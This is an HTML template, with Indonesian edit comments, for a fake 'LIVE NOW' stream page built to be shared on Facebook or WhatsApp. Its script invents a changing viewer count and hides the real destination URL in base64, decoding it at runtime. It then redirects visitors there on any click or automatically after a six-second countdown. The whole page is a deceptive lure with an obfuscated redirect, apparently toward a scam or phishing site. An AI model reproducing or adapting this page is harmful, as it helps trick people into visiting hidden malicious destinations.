<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">

<!-- ================== EDIT BAGIAN INI ================== -->

<!-- URL PAGE -->
<meta property="og:url" content="https://loading-view.vercel.app/">

<!-- JUDUL PREVIEW -->
<meta property="og:title" content="🔴 LIVE NOW - Join Before It Ends">

<!-- DESKRIPSI -->
<meta property="og:description" content="Live session is running. Tap to watch now.">

<!-- GAMBAR PREVIEW (FACEBOOK / WA) -->
<meta property="og:image" content="https://i.imgur.com/eYbBuux.jpeg">

<!-- ===================================================== -->

<meta property="og:site_name" content="Live Access">
<meta property="og:type" content="website">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Live Stream</title>

<style>
body {
  margin: 0;
  background: black;
  font-family: Arial;
  color: white;
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
}

.player {
  width: 92%;
  max-width: 380px;
  background: #111;
  border-radius: 16px;
  overflow: hidden;
  box-shadow: 0 0 25px rgba(0,0,0,0.8);
}

/* AREA VIDEO (BISA DIKLIK) */
.thumb {
  position: relative;
  cursor: pointer;
}

.thumb img {
  width: 100%;
  display: block;
}

/* LIVE BADGE */
.live {
  position: absolute;
  top: 10px;
  left: 10px;
  background: red;
  padding: 4px 8px;
  font-size: 12px;
  border-radius: 6px;
  font-weight: bold;
}

/* VIEWERS */
.viewers {
  position: absolute;
  bottom: 10px;
  left: 10px;
  font-size: 12px;
  background: rgba(0,0,0,0.6);
  padding: 4px 8px;
  border-radius: 6px;
}

/* PLAY BUTTON */
.play {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
  font-size: 42px;
  background: rgba(0,0,0,0.6);
  border-radius: 50%;
  padding: 12px 18px;
}

.info {
  padding: 15px;
  text-align: center;
}

.btn {
  margin-top: 10px;
  background: #00ffcc;
  color: black;
  border: none;
  padding: 13px;
  width: 100%;
  border-radius: 10px;
  font-weight: bold;
  cursor: pointer;
  font-size: 15px;
}

.count {
  font-size: 13px;
  opacity: 0.6;
  margin-top: 8px;
}
</style>
</head>

<body>

<div class="player">

  <!-- ================== EDIT GAMBAR VIDEO DISINI ================== -->
  <!-- INI GAMBAR YANG MUNCUL DI DALAM HALAMAN (BUKAN OG) -->
  <div class="thumb" onclick="go()">
    <img src="https://i.imgur.com/eYbBuux.jpeg">

    <div class="live">LIVE</div>
    <div class="viewers" id="viewer">👁 1,284 watching</div>
    <div class="play">▶</div>
  </div>
  <!-- =============================================================== -->

  <div class="info">
    <b>Live Stream Starting...</b>

    <button class="btn" onclick="go()">▶ Watch Now</button>

    <div class="count">
      Auto opening in <span id="time">6</span>s...
    </div>
  </div>

</div>

<script>

// ================== EDIT LINK DISINI ==================
let encoded = "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk=";
let target = atob(encoded);
// =====================================================

// FAKE VIEWER BIAR HIDUP
setInterval(()=>{
  let v = Math.floor(1000 + Math.random()*700);
  document.getElementById("viewer").innerText = "👁 " + v + " watching";
},2000);

// COUNTDOWN 6 DETIK
let t = 6;
let el = document.getElementById("time");

let timer = setInterval(()=>{
  t--;
  el.innerText = t;

  if(t <= 0){
    clearInterval(timer);
    window.location.href = target;
  }
},1000);

// CLICK FUNCTION
function go(){
  window.location.href = target;
}

</script>

</body>
</html>
